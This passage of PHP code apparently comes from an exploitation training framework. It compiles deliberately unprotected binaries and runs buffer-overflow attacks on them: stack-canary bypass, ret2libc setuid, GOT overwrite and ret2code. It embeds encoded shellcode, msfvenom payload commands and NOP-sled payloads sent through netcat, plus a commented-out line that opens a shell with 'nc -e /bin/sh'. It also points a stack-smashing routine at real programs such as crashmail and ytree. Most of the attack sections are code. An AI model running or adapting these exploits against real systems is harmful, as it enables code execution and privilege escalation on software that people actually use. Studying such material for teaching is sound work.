		$this->pause();
		
		$name = "ret2canary32l_get_canary_asm";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$programme = $bin->file_c2elf("-ggdb -fno-pie -z norelro -z execstack -fstack-protector-all -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl");
		$file_bin = new ret2canary4linux($programme->file_path);
		$this->pause();
		for ($i=0;$i<10;$i++)
		$this->requette("$file_bin->file_path AAAA");
		$this->pause();
		$this->note("Our canary is placed between local variable and the saved EBP");
		$this->pause();
		
		$name = "ret2canary32l_set_canary_asm";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$programme = $bin->file_c2elf("-ggdb -fno-pie -z norelro -z execstack -fstack-protector-all -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl");
		$file_bin = new ret2canary4linux($programme->file_path);
		$this->requette("$file_bin->file_path AAAAAAAAA");
		$this->requette("$file_bin->file_path AAAAAAAAAA");
		$this->requette("$file_bin->file_path AAAA");
		$this->requette("$file_bin->file_path AAAAAAAAAAC");
		$this->requette("$file_bin->file_path AAAAAAAAAACDEF");
		$this->pause();
		$this->article("Summary","
- kernel sets register GS at offset 0x14
- binary saves it between variable and saved EBP
- binary runs
- binary compares the canary and the register
- binary stops its execution if values are not the same
Why random canary or terminator canary on Linux ??
- it depends on glibc compilation
- terminator by default
- random if compiled with --enable-stackguard-randomization

NULL Canaries
L'une des premières formes de canaris de détection et de blocage fût le NULL canary. Il s'agit d'une
chaine de caractères empilée au-dessus du Frame Base Pointer et ayant pour valeur
'\\x00\\x00\\x00\\x00'.
Son utilité est double : d'une part, si sa valeur est altérée et détectée comme telle avant que la
fonction ne retourne, il est possible de lancer un appel à abort(), faisant échouer la tentative de prise
de contrôle du flux d'instructions. D'autre part, si un attaquant souhaite écraser les méta-données, il
doit donc mettre la chaine '\\x00\\x00\\x00\\x00' dans sa chaine d'attaque... ce qui a pour effet de
stopper la recopie d'un buffer de type chaine de caractères, le caractère nul étant le symbole de fin
de chaine en C.
Ce canari ne prévient pas des écritures arbitraires en mémoire, ni des dépassements de tampon
n'impliquant pas de recopie de chaines de caractères en mémoire.

NULL Terminator Canaries
Très vite, le NULL canary a été remplacé par le NULL Terminator canary. Un seul ou quatre
caractères nuls ont le même effet dans un canari ; aussi, les caractères composant ce canari ont été
diversifiés pour tenter de toucher encore plus de cas de recopies non contrôlées. Les caractères
'\\x0a' (LF), '\\x0d' (CR) et '\\xff' (EOF) ont ainsi été ajoutés à ce canari afin de donner la chaine :
'\\x00\\x0a\\xff\\x0d'.
Ce canari, tout comme les NULL canaries ne prévient pas des écritures arbitraires en mémoire, ni
des dépassements de tampon n'impliquant pas des chaines de caractères.");
		$this->pause();
		
			
		$name = "ret2canary_server2_32";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -fno-pie -z norelro -z execstack
		$programme = $bin->file_c2elf("-ggdb -fstack-protector -z execstack -mpreferred-stack-boundary=2 -m32  -fno-pie -z norelro -ldl"); // --enable-stackguard-randomization
		$file_bin = new ret2canary4linux($programme->file_path);
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S ps aux | grep $file_bin->file_name");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S kill -9 `pidof $file_bin->file_path`");
		$this->pause();
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S $file_bin->file_path");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S ps aux | grep $file_bin->file_name");
		$this->pause();
		$shellcode = '\xdb\xdd\xbb\xfb\xb8\xd9\xbc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x11\x31\x5a\x17\x03\x5a\x17\x83\x11\x44\x3b\x49\x8f\xbe\xe4\x2b\x1d\xa7\x7c\x61\xc2\xae\x9a\x11\x2b\xc2\x0c\xe2\x5b\x0b\xaf\x8b\xf5\xda\xcc\x1e\xe1\xc0\x12\x9f\xf1\x94\x71\xbf\x9d\x07\x15\xde\x31\xb0\xb6\x53\xbd\x60\x71\xac\x05\x59\xa1\xe1\x10\xb9\x8e\x9b\xb3\xd7\xff\x28\x2b\x28\x57\x9c\x22\xc9\x9a\xa2';
		$offset_ssp = 256;
		
		
		for ($i=$offset_ssp;$i<=$offset_ssp+1;$i++){
			//$this->requette("echo \$(python -c 'print \"\\x41\"*$i') >  $file_bin->file_dir/$file_bin->file_name.ssp.tmp ");
			//$this->requette("nc localhost 9999 -v  < $file_bin->file_dir/$file_bin->file_name.ssp.tmp");
			$this->requette("echo \$(python -c 'print \"A\"*$i')  | tr -d '\\n' | nc localhost 9999 ");
		}
		$this->pause();
		
		
		$this->note("Enter value of SSP ");
		//$ssp_addr = trim(fgets(STDIN));
		$ssp_addr = "0x55dd3e00";
		$ssp_rev = $this->hex2rev_32($ssp_addr);
		$this->pause();
		
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		$this->pause();
		$this->note("Enter value of EBP ");
		//$ebp_addr = trim(fgets(STDIN));
		$ebp_addr = "0xffffd514";
		$ebp_rev = $this->hex2rev_32($ebp_addr);
		$this->pause();
		$this->note("Enter value of EH ");
		//$ebp_addr = trim(fgets(STDIN));
		//$eh_addr = "0x080489e5";
		$eh_addr = "0x08048bb1";
		$eh_rev = $this->hex2rev_32($eh_addr);
		$this->pause();
		
		//$file_bin->dot4payload_eip_jmp2env();
		//$file_bin->elf4shellcode("nc localhost 8888 -e /bin/sh",'\x00\x20\x0a')->file_h2hex()->file_shellcode2env(100);
		
		//$file_bin->elf4shellcode("/bin/sh",'\x00\x20\x0a')->file_h2hex()->file_shellcode2env(100);
		
		//$eip_addr = $file_bin->elf2addr4env("shellcode");
		$eip_addr = "0xffffd1e4";
		$eip_rev = $this->hex2rev_32($eip_addr);
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"+\"$ebp_rev\"+\"$eh_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);


		
		
		/*
		$tmp = $eip_addr;
		$this->note("Brute force EIP ");
		
		for ($i=1600;$i<3600;$i++){
			$this->article("i",$i);
		$eip_addr = $this->addr2sub($tmp,$i);
		$eip_rev = $this->hex2rev_32($eip_addr);
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"+\"$ebp_rev\"+\"$eh_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);
		$this->requette("python -c 'print \"\\x90\"*165+\"$shellcode\"+\"$ssp_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);


		}
		*/

		
		exit();
		$eip_addr = $this->addr2sub($tmp,$i);
		$eip_rev = $this->hex2rev_32($eip_addr);
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$ebp_rev\"+\"$eh_rev\"+\"$eip_rev\"' | tr -d '\\n' | nc localhost 9999 ");
		sleep(1);
		echo "\n";
		
		
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$pad2_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$pad2_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$pad2_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$eip_rev\"+\"$eip_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$ebp_rev\"+\"$eip_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$ebp_rev\"+\"$eip_rev\"+\"$eip_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$pad1_rev\"+\"$eip_rev\"+\"$ebp_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"$ssp_rev\"+\"$eip_rev\"+\"$eip_rev\"+\"$eip_rev\"+\"$eip_rev\"' | tr -d '\\n' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
			
		
		
		
		
		
		
		exit();
		
		
		
		
		
		
		
		
		exit();
		$name = "ret2canary_server_32";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -fno-pie -z norelro -z execstack 
		$programme = $bin->file_c2elf("-ggdb -fstack-protector-all -z execstack -mtune=i386 -ldl -mpreferred-stack-boundary=2 -m32"); // --enable-stackguard-randomization
		$file_bin = new ret2canary4linux($programme->file_path);
		$this->pause();
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S $file_bin->file_path");
		$this->pause();
		$this->article("man 2 fork","
			- The entire virtual address space of the parent is  replicated  in  the child, including the states of mutexes, condition variables, and other pthreads objects
			- When fork() occurs, address space is mirrored
				fs:0x28 canary copied
			- We control [RBP-0x8] to get to RIP, we can partially overwrite to keep guessing value");
		/*
		for ($i=46;$i<50;$i++){
		$this->requette("echo \$(python -c 'print \"\\x41\"*$i') >  $file_bin->file_dir/$file_bin->file_name.ssp.tmp ");
		$this->requette("nc localhost 9999 -v  < $file_bin->file_dir/$file_bin->file_name.ssp.tmp");
		//$this->requette("echo \$(python -c 'print \"A\"*$i') | nc localhost 9999 -v");
		}
		$this->pause();
		*/
		$offset_ssp = 47;
		/*
		$this->requette("echo \$(python -c 'print \"\\x41\"*$offset_ssp') | nc localhost 9999 -v");
		$this->requette("echo \$(python -c 'print \"\\x41\"*48') | nc localhost 9999 -v");
		$this->pause();
		$this->titre("Identify SSP via Bruteforce");
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"\\x00\"' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"\\x01\"' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"\\x00\"+\"\\x01\"' > $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.ssp");
		$this->pause();
		*/
	
		
		
		
		
		
		exit();
		$this->titre("Identify next SSP as EIP ");
		//$this->img("$this->dir_img/bof/gs.png");
		
		$this->requette("python -c 'print \"\\x41\"*$offset_ssp+\"\\x00\"+\"$ssp_rev\"+\"\\x01\"+\"\\x02\"+\"\\x03\"+\"\\x04\"' > $file_bin->file_dir/$file_bin->file_name.eip");
		$this->requette("nc localhost 9999 -v < $file_bin->file_dir/$file_bin->file_name.eip");
		$this->pause();
		$file_bin_rop = new ret2rop4linux($file_bin->file_path);
		$file_bin_rop->ret2rop4linux_payload($offset_ssp);
		$this->pause();
		
		
		
		$this->notify("END OF LINUX CANARY");
		}
	
		public function poc4bof2root(){
		    $this->chapitre("BE ROOT");
		    // Covfefe bof2stack OR heap
		    $this->gtitre("BY SETUID 0");
		    //$this->poc4host4root4racecondition();
		    // poc4host4root4setuid0()
		    // ret2stack4linux_setuid()
		    //$this->poc4ret2lib4linux_setuid();
		    
		}
	

	
	public function poc4bof2ret2lib4linux_setuid(){
		
		$name = "ret2lib32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$ret2lib = $bin->file_c2elf("-ggdb -std=c99 -fno-pie -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -z norelro -ldl");
		$file_bin = new ret2lib4linux($ret2lib->file_path);
		
		//$overflow = $file_bin->elf2fuzzeling("","");
		//$offset = $file_bin->elf2offset4eip("",$overflow,"");
		$offset = 12 ;
		
		//$file_bin->ret2lib4linux_setuid_intro($offset); // OK 
		$file_bin->ret2lib4linux_setuid_printf_fmt3_execl($offset); 
		$file_bin->ret2lib4linux_setuid_printf_fmt3_system($offset); // fonctionne mais ne donne pas de setuid 0 avec system ; pas la peine a enlever
		$file_bin->ret2lib4linux_setuid_printf_fmt8($offset);
		$file_bin->ret2lib4linux_setuid_scanf($offset);
		$file_bin->ret2lib4linux_setuid_sprintf($offset);
	}

	public function poc4bof2ret2got4linux(){
		$timestamp_debut = $this->start("Bypass ASCII ARMOR + NX","\n-1 Bypass ASCII ARMOR Only \n-2 Bypass ASCII ARMOR + NX ");
		// add Bypass ASCII ARMOR + NX + ASLR
		$this->chapitre("Bypass ASCII ARMOR + NX" );
		$this->gtitre("Global Offset Table - GOT" );

		$name = "poc";
		$rep_path = "$this->dir_tmp/ret2got4linux";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		$rep_path = "$this->dir_tmp/ret2got4linux/$name";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		
		$this->os2aslr4no();
		
		$this->titre("CHECK IF ASCII ARMOR IS ACTIVED");

		$this->article("ELF dynamic linking", "Dans un programme au format ELF, il y a plusieurs références sur des objets comme des adresses de données ou de fonctions qui ne sont pas connues à la compilation.
		Pour effectuer la résolution de symboles à l’exécution, les programmes ELF font appel au au runtime link editor ld.so ");
		$this->article("GOT", "A la compillation le programme ne sait pas ou seront chargees les librairies partagees. Le Dynamic Linker va se charger de mettre les adresses reelles des fonctions partagees dans cette table afin que le programme puisse y acceder.");
		$this->pause();
	
		###########################################################		
		/*
		$name = "ret2got32l";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static  -z norelro
		$ret2got = $bin->file_c2elf(" -z execstack -std=c99 -fno-pie -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl");
		$file_bin = new ret2got4linux($ret2got);
		$file_bin->elf2checksec();
		
		$overflow = $file_bin->elf2fuzz4add(512,""); // OK
		$offset_eip = $file_bin->elf2offset4eip("",$overflow,""); // OK
		//$offset_eip = 524;
		
		
		$file_bin->ret2got_intro();$this->pause(); // OK

		$file_bin->ret2got_fonction($offset_eip);$this->pause(); // OK
		
		$file_bin->ret2got_env($offset_eip);$this->pause(); // OK
		*/
		###########################################################
	
	
		###########################################################
	
		$this->chapitre("Hijacking function - system +  exit +  bin_sh "); // OK
		$this->note("remove -z execstack ");
		$name = "ret2got32l2";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static  -z norelro
		$ret2got = $bin->file_c2elf(" -std=c99 -fno-pie -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl");
		$file_bin = new ret2got4linux($ret2got);
		
		$overflow = $file_bin->elf2fuzz4add(512,""); // OK
		$offset_eip = $file_bin->elf2offset4eip("",$overflow,""); // OK
		$file_bin->elf2checksec();
		//$offset_eip = 12;
	
		$file_bin->ret2got_system_exit_cmd_addr($offset_eip);$this->pause(); // OK
	
		$file_bin->ret2got_write_cmd2section($offset_eip);$this->pause(); // OK
		
		$file_bin->ret2got_gets_cmd($offset_eip);$this->pause(); // OK
		###########################################################
	
	
		###########################################################
		/*
		$file_bin->ret2got_patch();$this->pause(); // OK
	
		$this->rouge("PoC Protection Partiel RELRO");
		$this->gtitre("Compilation with gcc Protection - Partial RELRO");
		$this->article("RelRO : Relocate read-only", " La méthode de protection nommée RelRO est décomposée en deux sous-classes : Partial RelRO et Full RelRO.
		Un exécutable protégé par une relocalisation partielle en zone mémoire en lecture seule(Partial RelRO) voit ses sections GOT et autres constructeurs/destructeurs déplacés dans la structure du
		binaire et en mémoire avant la section .data et .bss. Cela a pour effet de protéger la PLT et la GOT des effets d'un dépassement de tampon dans les deux zones de données pré-citées. Par ailleurs,
		toutes les données de la GOT qui ne concernent pas directement le chargement de données dynamiques sont rendues en lecture seule.
		Un exécutable protégé par une relocalisation totale en zone mémoire en lecture seule(Full RelRO) est identique à un exécutable protégé en Partial RelRO à l'exception prête que la GOT est entièrement en lecture seule.
		En fait, un drapeau est fixé dans le code de démarrage de l'exécutable forçant celui-ci à charger toutes les bibliothèques externes et configurer la page mémoire de la GOT en lecture seule(appel à mprotect()) avant de donner la main à la fonction main().
		La protection RelRO peut être effectuée manuellement en modifiant les scripts de ld(le linker), pour modifier l'ordre des sections dans le fichier binaire, en appelant l'exécutable avec la variable ");
		$this->article("Il y a deux modes de RELRO [16] :","- Partial RELRO : compilé avec gcc -Wl,-z,relro, les non-PLT sont en lecture seule, mais le GOT est toujours en écriture.
		- Full RELRO : compilé avec gcc -Wl,-z,relro,-z,now, support des caractéristiques du RELRO partiel et le GOT entier est en lecture seule.
		");
		$this->note("remove -z execstack & -z norelro and put -z relro -> Partiel RELRO");
		$this->pause();
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, " -fno-pie -z relro -fno-stack-protector -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$who = "strcpy";
		$where = "puts";
		$tab_bin_sh = $file_bin->elf2addr4bin_sh_all();
		$bin_sh = $tab_bin_sh[0];
		$system = $file_bin->elf2addr4fonction_prog("system");
		$addr_exit = $file_bin->elf2addr4fonction_prog("exit");
		$file_bin->payload_ret2got_system_exit_cmd_addr($offset_eip,$who,$where, $system, $addr_exit, $bin_sh);
		$this->pause();
	
	
		$this->rouge("PoC Protection Full RELRO");
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "q -fno-pie -z relro -z now -fno-stack-protector -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$who = "strcpy";
		$where = "puts";
		$tab_bin_sh = $file_bin->elf2addr4bin_sh_all();
		$bin_sh = $tab_bin_sh[0];
		$system = $file_bin->elf2addr4fonction_prog("system");
		$addr_exit = $file_bin->elf2addr4fonction_prog("exit");
		$file_bin->payload_ret2got_system_exit_cmd_addr($offset_eip,$who,$where, $system, $addr_exit, $bin_sh);
		$this->pause();
		*/
		###########################################################
	
		$this->notify("END ".__FUNCTION__);
	}
	


	public function poc4bof2ret2code(){
		$this->chapitre("Cracking - KeyGen - Détournement du flux d'execution d'un programme" );
	
		$name = "ret2text32l";
		$rep_path = "$this->dir_tmp/$name";
		//if (file_exists($rep_path)) system("rm -r $rep_path");
		$this->create_folder($rep_path);
	
		$file_c = new file("$this->dir_c/ret2text32l.c");
		$file_bin_name = $file_c->c2bin4file("ret2text32l", "-m32 -w -z execstack -ggdb -fno-stack-protector  "); // compilation : -> -no PIE section .text est fixe en mémoire(PIE désactivé).
		$file_bin = new ret2code($file_bin_name);
		$file_bin->ret2code2text();
		$this->pause();
	
		$name = "ret2data32l";
		$rep_path = "$this->dir_tmp/$name";
		//if (file_exists($rep_path)) system("rm -r $rep_path");
		$this->create_folder($rep_path);
	
		$file_c = new file("$this->dir_c/ret2data32l.c");
		$file_bin_name = $file_c->c2bin4file("ret2data32l", "-m32 -w -z execstack -ggdb -fno-stack-protector  ");
		$file_bin = new ret2code($file_bin_name);
		$file_bin->ret2code2data();
		$this->pause();
	
		$name = "ret2bss32l";
		$rep_path = "$this->dir_tmp/$name";
		//if (file_exists($rep_path)) system("rm -r $rep_path");
		$this->create_folder($rep_path);
	
		$file_c = new file("$this->dir_c/ret2bss32l.c");
		$file_bin_name = $file_c->c2bin4file("ret2bss32l", "-m32 -z execstack -ggdb -fno-stack-protector  ");
		$file_bin = new ret2code($file_bin_name);
		$file_bin->ret2code2bss();
		$this->pause();
	}
	
	
	
	public function poc4bof2ret2stack4linux_exemple(){
	    $this->ssTitre(__FUNCTION__);
	    
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/sc-7.16/sc";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_sc();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 300;
	    //$offset_eip = 216;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 4000;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    exit();
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/crashmail-1.6/bin/crashmail";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_crashmail();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    $overflow = 300;
	    $offset_eip = 216;
	    //$overflow = $file_bin->elf2fuzzeling("SETTINGS","");
	    //$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 400;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    exit();
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/ytree-1.94/ytree";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_ytree();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    $overflow = 300;
	    $offset_eip = 290;
	    //$overflow = $file_bin->elf2fuzzeling("","");
	    //$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 400;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    exit();
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/xwpe";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_xwpe();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    $overflow = 300;
	    $offset_eip = 290;
	    //$overflow = $file_bin->elf2fuzzeling("","");
	    //$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 400;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/tiem";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_temu303();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 8200;
	    //$offset_eip = 8150;
	    $overflow = $file_bin->elf2fuzzeling("-rom","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
